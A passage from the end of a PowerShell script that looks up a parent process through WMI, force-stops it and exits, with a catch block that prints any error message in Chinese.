        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$( $instance.ParentProcessId )'"
    }
    if ($null -ne $parentProcessId)
    {
        Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
    }

    exit
}
catch
{
    Write-Host "发生错误：$( $_.Exception.Message )"
}
